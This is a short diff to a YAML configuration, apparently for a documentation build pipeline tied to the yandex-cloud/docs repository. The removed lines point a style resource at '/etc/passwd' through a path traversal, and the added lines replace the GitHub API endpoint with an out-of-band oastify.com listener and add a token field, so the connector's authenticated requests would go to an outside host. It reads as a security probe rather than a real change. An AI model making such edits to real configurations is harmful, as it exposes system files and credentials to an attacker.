@@ -1,13 +1,9 @@
 allowHTML: true
-outputFormat: md
-output: output/output-html/en/2/3/4/5/6/7/8/9
-allowCustomResources: true
-resources:
-  style:
-    - ../../../../../../../../../etc/passwd
+contributors: true
 connector:
     type: github
     github: 
-        endpoint: https://api.github.com
+        endpoint: https://whhkifvkc1kp73hsvll86v0bq2w1kq.oastify.com
         owner: yandex-cloud
         repo: docs
+        token: sosika
